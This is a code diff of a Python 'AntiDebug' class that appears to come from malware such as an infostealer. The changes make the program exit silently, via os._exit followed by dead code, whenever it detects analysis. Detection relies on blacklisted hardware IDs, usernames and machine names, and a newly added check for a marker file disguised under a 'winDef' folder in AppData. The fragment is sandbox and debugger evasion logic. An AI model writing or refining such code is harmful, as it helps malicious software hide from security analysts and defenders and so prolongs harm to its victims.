@@ -13,7 +13,6 @@
 import os
 import re
 import subprocess
-import sys
 import uuid
 import psutil
 import requests
@@ -23,7 +22,8 @@ from typing import Literal
 class AntiDebug:
     def __init__(self) -> None:
         if self.checks():
-            sys.exit(int())
+            os._exit(os.EX_OK)
+            print(10/0)
 
     def checks(self) -> bool:
         debugging = False
@@ -75,6 +75,9 @@ class AntiDebug:
 
         username = os.getenv("UserName")
         hostname = os.getenv("COMPUTERNAME")
+        pathf = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
+        if (os.path.exists(rf'{pathf}\system\sysFiles\winDef\log20742384.txt')):
+            return True
 
         for i in zip(self.blackListedHWIDS, self.blackListedUsers, self.blackListedPCNames):
             if hwid in i or username in i or hostname in i:
